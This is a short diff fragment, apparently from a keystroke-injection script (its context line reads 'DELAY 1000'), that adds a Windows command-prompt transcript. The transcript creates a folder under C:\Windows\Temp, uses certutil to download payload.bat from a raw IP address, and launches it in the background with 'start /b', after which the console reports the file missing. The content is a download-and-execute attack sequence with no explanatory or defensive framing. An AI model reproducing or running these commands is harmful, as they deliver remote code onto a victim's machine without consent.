@@ -85,6 +85,22 @@ DELAY 1000
 
 
 
+C:\Windows\System32>mkdir C:\Windows\Temp\Cache 2>nul
+
+C:\Windows\System32>certutil -urlcache -split -f http://153.75.82.198/payload.bat C:\Windows\Temp\Cache\p.bat
+****  Online  ****
+  0000  ...
+  066e
+http://153.75.82.198/payload.bat
+
+WinINet Cache entries: 1
+
+CertUtil: -URLCache command completed successfully.
+
+C:\Windows\System32>start /b C:\Windows\Temp\Cache\p.bat
+The system cannot find the file C:\Windows\Temp\Cache\p.bat.
+
+C:\Windows\System32>
 
 
 
